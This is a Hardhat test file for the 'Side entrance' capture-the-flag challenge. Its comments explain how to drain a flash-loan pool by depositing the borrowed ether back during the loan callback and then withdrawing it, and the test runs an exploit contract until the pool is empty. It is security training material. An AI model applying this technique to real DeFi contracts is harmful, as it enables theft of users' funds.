const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Side entrance", function () {
  let deployer, attacker;

  const ETHER_IN_POOL = ethers.utils.parseEther("1000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const SideEntranceLenderPoolFactory = await ethers.getContractFactory(
      "SideEntranceLenderPool",
      deployer
    );
    this.pool = await SideEntranceLenderPoolFactory.deploy();

    await this.pool.deposit({ value: ETHER_IN_POOL });

    this.attackerInitialEthBalance = await ethers.provider.getBalance(
      attacker.address
    );

    expect(await ethers.provider.getBalance(this.pool.address)).to.equal(
      ETHER_IN_POOL
    );
  });

  it("Exploit", async function () {
    // When calling flash loan
    // the contract only checks if the contract’s token balance has not decreased
    // but the balance of the flashLoan caller is ignored
    // Call flashLoan and in the callback (execute) deposit again
    // Then the caller will have the same balance in the SideEntranceLenderPool
    // but also tokens will be transferred to ExploitSideEntrance calling the withdraw function
    const ExploitSideEntrance = await ethers.getContractFactory(
      "ExploitSideEntrance",
      deployer
    );
    const exploitSideEntrance = (
      await ExploitSideEntrance.deploy(this.pool.address)
    ).connect(attacker);
    await exploitSideEntrance.attack();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
      "0"
    );

    // Not checking exactly how much is the final balance of the attacker,
    // because it'll depend on how much gas the attacker spends in the attack
    // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
      this.attackerInitialEthBalance
    );
  });
});
